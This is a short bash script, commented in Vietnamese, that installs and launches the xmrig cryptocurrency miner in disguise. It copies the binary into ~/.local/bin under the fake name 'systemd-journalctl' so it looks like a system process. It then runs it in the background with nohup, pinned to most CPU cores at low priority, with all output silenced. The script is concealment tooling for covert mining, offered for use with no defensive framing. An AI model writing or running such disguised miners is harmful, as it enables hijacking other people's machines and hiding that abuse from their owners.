#!/bin/bash

# Đường dẫn giả của xmrig
FAKE_NAME="systemd-journalctl"
FAKE_PATH="$HOME/.local/bin/$FAKE_NAME"

# CPU core dùng (0-6 = 7 cores ~ 90% trên máy 8 core)
CPU_CORES="0-6"

# Kiểm tra nếu chưa copy xmrig thì copy
if [ ! -f "$FAKE_PATH" ]; then
    mkdir -p "$HOME/.local/bin"
    cp ./xmrig "$FAKE_PATH"
    chmod +x "$FAKE_PATH"
fi

# Chạy ngầm miner
nohup taskset -c $CPU_CORES nice -n 19 "$FAKE_PATH" -c ./config.json > /dev/null 2>&1 &
